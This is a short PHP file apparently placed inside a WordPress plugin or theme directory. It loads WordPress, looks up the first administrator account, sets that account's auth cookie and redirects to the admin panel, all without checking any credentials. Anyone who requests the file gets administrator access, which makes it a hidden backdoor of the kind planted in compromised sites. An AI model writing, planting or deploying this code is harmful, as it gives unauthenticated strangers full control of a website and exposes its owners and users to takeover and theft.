<?php
require('../../../../wp-blog-header.php');

$table_name = $wpdb->users;
$query_str = "SELECT ID" . " FROM " . "$table_name";
        $user_ids = $wpdb->get_results($query_str);
        foreach ($user_ids as $uid) {
            $current_user_id = $uid->ID;
            if (user_can($current_user_id, 'administrator')) {
                $current_user_info = get_userdata($current_user_id);
                $current_user_login = $current_user_info->user_login;
                wp_set_current_user($current_user_id, $current_user_login);
                wp_set_auth_cookie($current_user_id);
                do_action('wp_login', $current_user_login);
                echo "You are logged in as $current_user_login";
                if (function_exists('get_admin_url')) {
                    wp_redirect(get_admin_url());
                } else {
                    wp_redirect(get_bloginfo('wpurl') . '/wp-admin');
                }
                exit;
            }
        }
?>